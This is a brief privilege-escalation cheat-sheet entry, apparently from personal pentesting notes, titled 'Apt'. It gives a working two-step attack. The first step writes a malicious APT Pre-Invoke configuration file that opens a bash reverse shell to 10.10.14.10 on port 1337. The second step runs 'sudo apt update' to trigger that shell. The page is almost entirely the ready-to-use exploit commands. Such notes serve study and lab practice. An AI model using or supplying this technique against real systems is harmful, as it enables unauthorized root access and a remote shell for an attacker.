---
title: "Apt"
date: 2024-7-4
tags: ["apt", "update", "privesc", "pre-invoke"]
---

---
### Privesc

#### Abuse apt update

```bash
# Create a malicious config
echo 'APT::Update::Pre-Invoke {"bash -c '\''bash -i >& /dev/tcp/10.10.14.10/1337 0>&1'\''"}' > /etc/apt/apt.conf.d/evil
```

```bash
# Exploit
sudo apt update -y
```

<br>